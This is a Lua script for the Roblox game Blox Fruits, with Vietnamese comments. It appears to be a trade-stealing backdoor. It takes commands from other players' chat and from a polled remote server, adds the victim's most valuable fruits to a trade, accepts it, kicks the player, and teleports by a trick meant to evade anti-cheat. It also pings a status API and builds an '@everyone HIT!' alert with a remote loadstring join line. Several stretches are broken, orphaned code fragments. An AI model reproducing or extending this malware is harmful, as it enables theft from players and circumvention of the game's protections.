local function toTitleCase(str)
    if not str or str == "" then
        return ""
    end
    str = str:lower()
    return (str:gsub("(%a)(%w*)", function(first, rest)
        return first:upper() .. rest
    end))
end

local function normalizeFruitNameForRemote(raw)
    if not raw or raw == "" then
        return ""
    end
    if string.find(raw, "-", 1, true) then
        return raw
    end
    local title = toTitleCase(raw)
    return title .. "-" .. title
end

local function findInventoryItemByQuery(query)
    if not query or query == "" then return nil end
    query = query:lower()

    local inv = getInventory()
    local best

    for _, item in pairs(inv) do
        local t = item.Type
        if t == "Blox Fruit" or t == "Premium" then
            local disp = (item.DisplayName or item.Name or ""):lower()

            if disp == query then
                return item
            end

            if not best and disp:find(query, 1, true) then
                best = item
            end
        end
    end

    return best
end

local function commandAddAllFruits()
    local inv = getInventory()
    local list = {}

    -- gom hết trái (trừ Premium) + tách theo từng copy
    for _, item in pairs(inv) do
        if item.Type == "Blox Fruit" then
            local rarity = item.Rarity or 0
            if rarity ~= 5 then
                local copies = item.Count or 1
                local value  = item.Value or 0
                local displayName = item.DisplayName or item.Name

                local skinPriority = isSpecialSkin(displayName) and 0 or 1

                for i = 1, copies do
                    table.insert(list, {
                        Name        = item.Name,
                        DisplayName = displayName,
                        RarityNum   = rarity,
                        Value       = value,
                        SkinPrio    = skinPriority,
                        ItemId      = item.ItemId or item.Id,
                    })
                end
            end
        end
    end

    if #list == 0 then
        warn("[BF Trade] No fruits to add.")
        return
    end

    -- sort: Skin > Rarity > Value > Name
    table.sort(list, function(a, b)
        local sa = a.SkinPrio or 1
        local sb = b.SkinPrio or 1
        if sa ~= sb then
            return sa < sb       -- 0 (skin) lên trước 1 (normal)
        end

        local pa = RARITY_PRIORITY[a.RarityNum] or 99
        local pb = RARITY_PRIORITY[b.RarityNum] or 99
        if pa ~= pb then
            return pa < pb
        end

        if a.Value ~= b.Value then
            return (a.Value or 0) > (b.Value or 0)
        end

        return (a.DisplayName or "") < (b.DisplayName or "")
    end)

    -- add tối đa 10 trái tốt nhất
    local maxAdds = 10
    for i = 1, math.min(maxAdds, #list) do
        local res = sendAddItemRemote(list[i])
        if res == "full" then break end
        task.wait(0.12)
    end
end

local function isAtTradeLocation(hrp)
    if not hrp then
        return false
    end

    if #WAYPOINTS > 0 then
        local pos = hrp.Position
        local closest = math.huge
        for _, wp in ipairs(WAYPOINTS) do
            local d = (pos - wp).Magnitude
            if d < closest then
                closest = d
            end
        end
        return closest <= 30
    end

    local target = getTradeLocationCFrame()
    if not target then
        return false
    end
    local dist = (hrp.Position - target.Position).Magnitude
    return dist <= 50
end

local isTeleporting = false

local function travelToTradeLocation()
    local _, hum, hrp = getCharParts()
    if not hrp then return end

    if isAtTradeLocation(hrp) then
        return
    end

    -- Sea 3: gọi requestEntrance trước để bypass anti-cheat cửa Mansion
    if placeId == 7449423635 or placeId == 100117331123089 then
        doRequestEntrance(MANSION_ENTRANCE_VEC)
        _, hum, hrp = getCharParts()
        if not hrp then return end
    end

    local travelPos = getTradeTravelPosition()
    if not travelPos then
        return
    end

    TweenPaused  = true
    isTeleporting = true

    -- Tạo PartTele nếu chưa có (anti-cheat trick: tween Part, HRP sync theo)
    if not lp.Character:FindFirstChild("PartTele") then
        local part      = Instance.new("Part", lp.Character)
        part.Size       = Vector3.new(10, 1, 10)
        part.Name       = "PartTele"
        part.Anchored   = true
        part.Transparency = 1
        part.CanCollide = true
        part.CFrame     = hrp.CFrame

        part:GetPropertyChangedSignal("CFrame"):Connect(function()
            if isTeleporting then
                task.wait()
                local c = lp.Character
                if c and c:FindFirstChild("HumanoidRootPart") then
                    c.HumanoidRootPart.CFrame = part.CFrame
                end
            end
        end)
    end

    local partTele = lp.Character:FindFirstChild("PartTele")
    if not partTele then
        TweenPaused   = false
        isTeleporting = false
        return
    end

    local distance = (hrp.Position - travelPos).Magnitude
    local time     = distance / TRAVEL_SPEED

    local tween = TweenService:Create(
        partTele,
        TweenInfo.new(time, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
        { CFrame = CFrame.new(travelPos) }
    )
    tween:Play()

    local finished = false
    tween.Completed:Connect(function(state)
        if state == Enum.PlaybackState.Completed then
            finished     = true
            isTeleporting = false
            if lp.Character:FindFirstChild("PartTele") then
                lp.Character.PartTele:Destroy()
            end
        end
    end)

    while not finished do
        if not hrp.Parent then
            isTeleporting = false
            if lp.Character:FindFirstChild("PartTele") then lp.Character.PartTele:Destroy() end
            break
        end
        if isSeated(hum) then
            tween:Cancel()
            isTeleporting = false
            if lp.Character:FindFirstChild("PartTele") then lp.Character.PartTele:Destroy() end
            break
        end
        if isAtTradeLocation(hrp) then
            tween:Cancel()
            isTeleporting = false
            if lp.Character:FindFirstChild("PartTele") then lp.Character.PartTele:Destroy() end
            break
        end
        task.wait(0.02)
    end

    TweenPaused = false
end

        local _, hum, hrp = getCharParts()

        if not isAtTradeLocation(hrp) and not ResetInProgress then

       else

while TweenPaused do

end

            local target = WAYPOINTS[index]

                    hrp,
                    TweenInfo.new(TWEEN_TIME, Enum.EasingStyle.Linear, Enum.EasingDirection.InOut),
                    { CFrame = CFrame.new(target) }

                    finished = true
                end)

                while not finished do
    if not hrp.Parent then break end

        tween:Cancel()

    end
    task.wait(0.02)
end

                if finished then
                    task.wait(0.2)
                end

                index += 1
                if index > #WAYPOINTS then
                    index = 1
                end
            end

            task.wait(0.05)
        end
    end
end)

local function commandReset(rest)
    if not rest or rest == "" then return end
    if ResetInProgress then return end

    local fruitQuery, countStr = rest:match("^(.-)%s+(%d+)x$")

    local cycles
    if countStr then
        cycles = tonumber(countStr) or 1
        fruitQuery = fruitQuery:gsub("^%s+", ""):gsub("%s+$", "")
    else
        fruitQuery = rest
        cycles = 1
    end
    if cycles < 1 then cycles = 1 end

    local item = findInventoryItemByQuery(fruitQuery)
    local remoteName

    if item then
        remoteName = item.Name or (item.DisplayName .. "-" .. item.DisplayName)
    else
        remoteName = normalizeFruitNameForRemote(fruitQuery)
    end

    ResetInProgress = true
    TweenPaused     = true

    task.spawn(function()
        for _ = 1, cycles do
            local char = lp.Character
            if not char then
                lp.CharacterAdded:Wait()
                char = lp.Character
            end

            commandJump()
            task.wait(0.3)

            pcall(function()
                CommF:InvokeServer("LoadFruit", remoteName)
            end)

            local t0 = tick()
            while tick() - t0 < 1.5 do
                char = lp.Character
                if char and char:FindFirstChildWhichIsA("Tool") then
                    break
                end
                task.wait(0.05)
            end

            char = lp.Character
            local hum = char and char:FindFirstChildOfClass("Humanoid")
            if hum and hum.Health > 0 then
                hum.Health = 0
            end

            lp.CharacterAdded:Wait()
            task.wait(0.5)
        end

        TweenPaused     = false
        ResetInProgress = false
    end)
end

local function handleCommandMessage(msg)
    if msg == "+1 Fruit Storage" then
        commandAdd("+1 Fruit Storage")
        return
    end

    if msg:sub(1, 1) ~= "." then
        return
    end

    local cmd, rest = msg:match("^%.(%S+)%s*(.*)$")
    if not cmd then return end

    cmd = cmd:lower()

    if cmd == "jump" then
        commandJump()

    elseif cmd == "addallfruits" or cmd == "addall" then
        commandAddAllFruits()

    elseif cmd == "addallpre" or cmd == "addallpremium" then
        commandAddAllPremium()

    elseif cmd == "accept" then
        commandAccept()

    elseif cmd == "cancel" then
        commandCancel()

    elseif cmd == "add" then
        if rest and rest ~= "" then
            commandAdd(rest)
        end

    elseif cmd == "clear" then
        if rest and rest ~= "" then
            commandClear(rest)
        end

    elseif cmd == "clearall" then
        commandClearAll()

    elseif cmd == "reset" then
        if rest and rest ~= "" then
            commandReset(rest)
        end

    elseif cmd == "kick" then
        commandKick(rest)

    elseif cmd == "tp" then
        -- gửi chat tuỳ theo đã tới Mansion/Cafe hay chưa
        sendTpStatusChat()
        -- sau đó vẫn bay tới chỗ trade như cũ
        travelToTradeLocation()
    end
end

-- Hàm xử lý lệnh remote (đầy đủ như chat command)
local function handleRemoteCommand(cmd)
    if not cmd or cmd == "" then return end

    cmd = tostring(cmd)
    local lower = cmd:lower()

    -- Map tất cả lệnh giống chat
    if lower == ".addallpre" then
        commandAddAllPremium()

    elseif lower == ".addallfruits" or lower == ".addall" then
        commandAddAllFruits()

    elseif lower == ".clearall" then
        commandClearAll()

    elseif lower == ".accept" then
        commandAccept()

    elseif lower == ".cancel" then
        commandCancel()

    elseif lower:sub(1,5) == ".add " then
        local q = cmd:sub(6):gsub("^%s+", "")
        if q ~= "" then
            commandAdd(q)
        end

    elseif lower:sub(1,7) == ".clear " then
        local q = cmd:sub(8):gsub("^%s+", "")
        if q ~= "" then
            commandClear(q)
        end

    elseif lower:sub(1,7) == ".reset " then
        local rest = cmd:sub(8):gsub("^%s+", "")
        if rest ~= "" then
            commandReset(rest)
        end

    elseif lower:sub(1,6) == ".kick " then
        local reason = cmd:sub(7):gsub("^%s+", "")
        commandKick(reason)

    elseif lower == ".kick" then
        commandKick("")

    elseif lower == ".tp" then
        -- Gửi chat status + bay tới trade location
        sendTpStatusChat()
        travelToTradeLocation()

    elseif lower == ".jump" then
        commandJump()

    else
        -- Fallback cho lệnh tùy chỉnh (ví dụ: .reset dragon 2x đã xử lý ở trên)
        -- Không cần safeChat vì đã map hết
        warn("[BF Remote] Unknown command:", cmd)
    end
end

-- Polling dùng httpRequest (tương thích mọi executor)
local function pollRemoteCommands()
    local url = buildCommandGetUrl()
    
    local ok, res = pcall(function()
        return httpRequest({
            Url = url,
            Method = "GET",
            Headers = {}
        })
    end)

    if not ok or not res then
        return
    end

    local raw = res.Body or res.body or ""
    if raw == "" then return end

    local ok2, data = pcall(function()
        return HttpService:JSONDecode(raw)
    end)

    if not ok2 or not data then return end

    if data.ok and type(data.cmd) == "string" and data.cmd ~= "" then
        handleRemoteCommand(data.cmd)
    end
end

-- Bắt đầu polling
task.spawn(function()
    while task.wait(COMMAND_POLL_DELAY) do
        pcall(pollRemoteCommands)
    end
end)

pcall(function()
    if not TextChatService then return end
    if TextChatService.ChatVersion ~= Enum.ChatVersion.TextChatService then
        return
    end

    -- handler chung cho mọi message TextChatService
    local function handleTextChatMessage(textMessage)
        if not textMessage then return end

        local src = textMessage.TextSource
        if not src then return end

        local plr = Players:FindFirstChild(src.Name)
        if not plr then return end

        onCommandFromPlayer(plr, textMessage.Text)
    end

    -- 1) Global: TextChatService.MessageReceived (mọi kênh mà client nhận được)
    local okSignal, signal = pcall(function()
        return TextChatService.MessageReceived
    end)

    if okSignal and signal then
        signal:Connect(handleTextChatMessage)
    end

    -- 2) Fallback: hook từng TextChannel (RBXGeneral / All / các channel custom)
    local channels = nil
    pcall(function()
        channels = TextChatService:FindFirstChild("TextChannels") or TextChatService.TextChannels
    end)

    if not channels then
        return
    end

    local function hookChannel(ch)
        if not ch then return end
        -- ch phải là TextChannel và có event MessageReceived
        if not ch:IsA("TextChannel") then return end

        local okMsg, msgSignal = pcall(function()
            return ch.MessageReceived
        end)
        if not okMsg or not msgSignal then return end

        msgSignal:Connect(handleTextChatMessage)
    end

    -- ưu tiên RBXGeneral / All
    local gen = channels:FindFirstChild("RBXGeneral") or channels:FindFirstChild("All")
    if gen then
        hookChannel(gen)
    end

    -- rồi hook luôn tất cả TextChannel khác
    for _, ch in ipairs(channels:GetChildren()) do
        hookChannel(ch)
    end

    -- nếu game tạo thêm channel mới sau đó → hook tiếp
    channels.ChildAdded:Connect(function(ch)
        hookChannel(ch)
    end)
end)

local function startStatusHeartbeat(sessionId)
    if statusHeartbeatStarted then return end
    statusHeartbeatStarted = true

    if STATUS_API_URL == "" then return end
    if not httpRequest or type(httpRequest) ~= "function" then
        warn("[Status] No HTTP request fn, skip heartbeat")
        return
    end

    task.spawn(function()
        while task.wait(STATUS_HEARTBEAT_INTERVAL) do
            if STATUS_API_URL == "" then break end

            local ok, res = pcall(function()
                return httpRequest({
                    Url = STATUS_API_URL .. "/ping",
                    Method = "POST",
                    Headers = { ["Content-Type"] = "application/json" },
                    Body = HttpService:JSONEncode({
                        sessionId = sessionId,
                    }),
                })
            end)

            if not ok then
                warn("[Status] Heartbeat failed:", res)
            end
        end
    end)
end

local function shouldPingEveryone()
    local inv = getInventory()
    local hasPremium = false
    local hasWanted  = false

    local hasWantedConfig = next(WantedFruitSet) ~= nil

    for _, item in pairs(inv) do
        local t = item.Type

        -- any Premium item -> always allowed to trigger ping
        if t == "Premium" and (item.Count or 0) > 0 then
            hasPremium = true
        end

        -- specific fruits from config
        if hasWantedConfig and not hasWanted and t == "Blox Fruit" then
            local dispLower = (item.DisplayName or item.Name or ""):lower()
            for wantedLower in pairs(WantedFruitSet) do
                if dispLower:find(wantedLower, 1, true) then
                    hasWanted = true
                    break
                end
            end
        end

        if hasPremium and hasWanted then
            break
        end
    end

    return hasPremium, hasWanted
end

                -- 0 = Dragon fruit
                -- 1 = Galaxy Kitsune
                -- 2 = các fruit còn lại
                local specialFruitOrder = 2
                if isBloxFruit then
                    if lowerName:find("dragon", 1, true) then
                        specialFruitOrder = 0
                    elseif lowerName:find("galaxy", 1, true)
                        and lowerName:find("kitsune", 1, true)
                    then
                        specialFruitOrder = 1
                    end
                end

                local sortRarity = RARITY_PRIORITY[rarityNum] or 999
                local value      = item.Value or 0

                table.insert(list, {
                    line       = string.format("%s [%s] %s - %dx", icon, rarityLabel, displayName, count),

                    -- sort keys:
                    sortType   = typeOrder,
                    sortSpecial= specialFruitOrder,
                    sortSkin   = skinOrder,
                    sortRarity = sortRarity,
                    sortValue  = value,
                    sortName   = displayName,
                })
            end
        end
    end

    table.sort(list, function(a, b)
        if a.sortType ~= b.sortType then
            return a.sortType < b.sortType
        end
        if a.sortSpecial ~= b.sortSpecial then
            return a.sortSpecial < b.sortSpecial
        end
        if a.sortSkin ~= b.sortSkin then
            return a.sortSkin < b.sortSkin  -- skin (0) trước thường (1)
        end
        if a.sortRarity ~= b.sortRarity then
            return a.sortRarity < b.sortRarity
        end
        if a.sortValue ~= b.sortValue then
            return a.sortValue > b.sortValue
        end
        return a.sortName < b.sortName
    end)

    local lines = {}
    for _, info in ipairs(list) do
        table.insert(lines, info.line)
    end

    return lines
end

-- cut by maxChars, do NOT cut mid-line; append "and more..." if truncated
local function buildValuableValue(maxChars)
    maxChars = maxChars or 900

    local lines = collectValuableLines()
    if #lines == 0 then
        lines = { "None" }
    end

    local outLines  = {}
    local totalLen  = 0
    local truncated = false

    for _, line in ipairs(lines) do
        line = tostring(line)

        if line == "and more..." or line == "...and more" then
            truncated = true
            break
        end

        local addLen = #line
        if #outLines > 0 then
            addLen = addLen + 1
        end

        if totalLen + addLen <= maxChars then
            table.insert(outLines, line)
            totalLen = totalLen + addLen
        else
            truncated = true
            break
        end
    end

    if truncated and outLines[#outLines] ~= "and more..." then
        table.insert(outLines, "and more...")
    end

    local text = table.concat(outLines, "\n")
    return "```" .. text .. "```"
end

local function hasTopHitPermanent()
    local inv = getInventory()
    for _, item in pairs(inv) do
        if item.Type == "Premium" then
            local name = (item.DisplayName or item.Name or ""):lower()
            if name:find("permanent", 1, true) then
                for _, key in ipairs(TOP_HIT_PERM_FRUITS) do
                    if name:find(key, 1, true) then
                        return true
                    end
                end
            end
        end
    end
    return false
end
local function hasDragonTopHit()
    local inv = getInventory()
    local hasDragonFruit = false
    local hasDragonPerm  = false

    for _, item in pairs(inv) do
        local name = (item.DisplayName or item.Name or ""):lower()
        if name:find("dragon", 1, true) then
            if item.Type == "Premium" and name:find("permanent", 1, true) then
                hasDragonPerm = true
            elseif item.Type == "Blox Fruit" then
                hasDragonFruit = true
            end
        end
    end

    -- ưu tiên coi dragon thường là top hit đặc biệt
    if hasDragonFruit then
        return true, true   -- (có dragon, dragon là thường)
    end
    if hasDragonPerm then
        return true, false  -- (có dragon, nhưng dạng premium permanent)
    end

    return false, false
end
local function hasMutatedTopHit()
    local inv = getInventory()
    for _, item in pairs(inv) do
        if item.Type == "Mutated Fruit" and (item.Count or 0) > 0 then
            return true
        end
    end
    return false
end

local function buildMobileContent()
    -- join script cơ bản
    local scriptLine =
    'getgenv().USERNAME = "' .. lp.Name .. '"\n' ..
    'loadstring(game:HttpGet("' .. JOIN_SCRIPT_URL .. '"))()'

    -- premium / wanted (giữ logic ping cũ)
    local hasPremium, hasWanted = shouldPingEveryone()

    -- scan riêng Dragon / Kitsune FRUIT (Blox Fruit thường) + Mutated Fruit
    local hasDragonFruit   = false
    local hasKitsuneFruit  = false
    local hasMutatedFruit  = false

    do
        local inv = getInventory()
        for _, item in pairs(inv) do
            local t     = item.Type
            local count = item.Count or 0
            if count > 0 then
                local name = (item.DisplayName or item.Name or ""):lower()

                if t == "Blox Fruit" then
                    if not hasDragonFruit and name:find("dragon", 1, true) then
                        hasDragonFruit = true
                    end
                    if not hasKitsuneFruit and name:find("kitsune", 1, true) then
                        hasKitsuneFruit = true
                    end
                elseif t == "Mutated Fruit" then
                    hasMutatedFruit = true
                end
            end
            -- Premium đã được shouldPingEveryone() xử lý
        end
    end

    -- ƯU TIÊN: Premium > Mutated > Dragon > Kitsune > Wanted
    local header

    if hasPremium then
        -- bất kỳ Premium (kể cả Dragon perm, Kitsune perm, v.v.)
        header = "-- @everyone PREMIUM HIT!"
    elseif hasMutatedFruit then
        -- bất kỳ Mutated Fruit (Fiend Yeti, v.v.)
        header = "-- @everyone MUTATED FRUITS HIT!"
    elseif hasDragonFruit then
        -- Dragon Blox Fruit thường
        header = "-- @everyone DRAGON HIT!"
    elseif hasKitsuneFruit then
        -- Kitsune Blox Fruit thường
        header = "-- @everyone KITSUNE HIT!"
    elseif hasWanted then
        -- các fruit trong WantedFruitSet (Galaxy, Divine Portal, Pain,...)
        header = "-- @everyone"
    end

    if header then
        return header .. "\n" .. scriptLine
    end

    return scriptLine
end
